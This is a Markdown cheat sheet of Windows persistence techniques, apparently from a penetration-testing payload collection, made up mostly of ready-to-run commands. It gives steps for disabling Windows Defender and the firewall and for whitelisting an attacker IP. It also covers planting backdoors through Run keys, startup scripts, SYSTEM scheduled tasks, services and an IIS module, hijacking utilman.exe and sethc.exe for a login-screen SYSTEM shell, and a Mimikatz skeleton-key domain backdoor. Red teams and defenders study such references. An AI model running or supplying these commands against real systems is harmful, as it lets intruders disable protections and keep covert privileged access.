# Windows - Persistence

## Summary

* [Tools](#tools)
* [Disable Windows Defender](#disable-windows-defender)
* [Disable Windows Firewall](#disable-windows-firewall)
* [Userland](#userland)
    * [Registry](#registry)
    * [Startup](#startup)
    * [Scheduled Task](#scheduled-task)
* [Serviceland](#serviceland)
    * [IIS](#iis)
    * [Windows Service](#windows-service)
* [Elevated](#elevated)
    * [HKLM](#hklm)
    * [Services](#services)
    * [Scheduled Task](#scheduled-task)
    * [Binary Replacement](#binary-replacement)
        * [Binary Replacement on Windows XP+](#binary-replacement-on-windows-xp)
        * [Binary Replacement on Windows 10+](#binary-replacement-on-windows-10)
    * [RDP Backdoor](#rdp-backdoor)
        * [utilman.exe](#utilman.exe)
        * [sethc.exe](#sethc.exe)
    * [Skeleton Key](#skeleton-key)
* [References](#references)


## Tools

- [SharPersist - Windows persistence toolkit written in C#. - @h4wkst3r](https://github.com/fireeye/SharPersist)

## Disable Windows Defender

```powershell
sc config WinDefend start= disabled
sc stop WinDefend
Set-MpPreference -DisableRealtimeMonitoring $true
```

## Disable Windows Firewall

```powershell
Netsh Advfirewall show allprofiles
NetSh Advfirewall set allprofiles state off

# ip whitelisting
New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP
```

## Userland

Set a file as hidden

```powershell
attrib +h c:\autoexec.bat
```

### Registry

Create a REG_SZ value in the Run key within HKCU\Software\Microsoft\Windows.

```powershell
Value name:  Backdoor
Value data:  C:\Users\Rasta\AppData\Local\Temp\backdoor.exe
```

Using SharPersist

```powershell
SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add
SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add -o env
SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "logonscript" -m add
```

### Startup

Create a batch script in the user startup folder.

```powershell
PS C:\> gc C:\Users\Rasta\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.bat
start /b C:\Users\Rasta\AppData\Local\Temp\backdoor.exe
```

Using SharPersist

```powershell
SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "Some File" -m add
```

### Scheduled Task

```powershell
PS C:\> $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe"
PS C:\> $T = New-ScheduledTaskTrigger -AtLogOn -User "Rasta"
PS C:\> $P = New-ScheduledTaskPrincipal "Rasta"
PS C:\> $S = New-ScheduledTaskSettingsSet
PS C:\> $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
PS C:\> Register-ScheduledTask Backdoor -InputObject $D
```

Using SharPersist

```powershell
# Add to a current scheduled task
SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add

# Add new task
SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
```

## Serviceland

### IIS

IIS Raid – Backdooring IIS Using Native Modules

```powershell
$ git clone https://github.com/0x09AL/IIS-Raid
$ python iis_controller.py --url http://192.168.1.11/ --password SIMPLEPASS
C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:Module Name /image:"%windir%\System32\inetsrv\IIS-Backdoor.dll" /add:true
```

### Windows Service

Using SharPersist

```powershell
SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Service" -m add
```

## Elevated

### HKLM

Similar to HKCU. Create a REG_SZ value in the Run key within HKLM\Software\Microsoft\Windows.

```powershell
Value name:  Backdoor
Value data:  C:\Windows\Temp\backdoor.exe
```

### Services

Create a service that will start automatically or on-demand.

```powershell
PS C:\> New-Service -Name "Backdoor" -BinaryPathName "C:\Windows\Temp\backdoor.exe" -Description "Nothing to see here."
```

### Scheduled Tasks

Scheduled Task to run as SYSTEM, everyday at 9am.

```powershell
PS C:\> $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Windows\Temp\backdoor.exe"
PS C:\> $T = New-ScheduledTaskTrigger -Daily -At 9am
PS C:\> $P = New-ScheduledTaskPrincipal "NT AUTHORITY\SYSTEM" -RunLevel Highest
PS C:\> $S = New-ScheduledTaskSettingsSet
PS C:\> $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
PS C:\> Register-ScheduledTask Backdoor -InputObject $D
```

### Binary Replacement

#### Binary Replacement on Windows XP+

| Feature             | Executable                            |
|---------------------|---------------------------------------|
| Sticky Keys         | C:\Windows\System32\sethc.exe         |
| Accessibility Menu  | C:\Windows\System32\utilman.exe       |
| On-Screen Keyboard  | C:\Windows\System32\osk.exe           |
| Magnifier           | C:\Windows\System32\Magnify.exe       |
| Narrator            | C:\Windows\System32\Narrator.exe      |
| Display Switcher    | C:\Windows\System32\DisplaySwitch.exe |
| App Switcher        | C:\Windows\System32\AtBroker.exe      |

#### Binary Replacement on Windows 10+

Exploit a DLL hijacking vulnerability in the On-Screen Keyboard **osk.exe** executable.

Create a malicious **HID.dll** in  `C:\Program Files\Common Files\microsoft shared\ink\HID.dll`.


### RDP Backdoor

#### utilman.exe

At the login screen, press Windows Key+U, and you get a cmd.exe window as SYSTEM.

```powershell
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
```

#### sethc.exe
 
Hit F5 a bunch of times when you are at the RDP login screen.

```powershell
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
```

### Skeleton Key

```powershell
# Exploitation Command runned as DA:
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DCs FQDN>

# Access using the password "mimikatz"
Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
```

## References

* [A view of persistence - Rastamouse](https://rastamouse.me/2018/03/a-view-of-persistence/)
* [Windows Persistence Commands - Pwn Wiki](http://pwnwiki.io/#!persistence/windows/index.md)
* [SharPersist Windows Persistence Toolkit in C - Brett Hawkins](http://www.youtube.com/watch?v=K7o9RSVyazo)
* [IIS Raid – Backdooring IIS Using Native Modules - 19/02/2020](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/)
* [Old Tricks Are Always Useful: Exploiting Arbitrary File Writes with Accessibility Tools - Apr 27, 2020 - @phraaaaaaa](https://iwantmore.pizza/posts/arbitrary-write-accessibility-tools.html)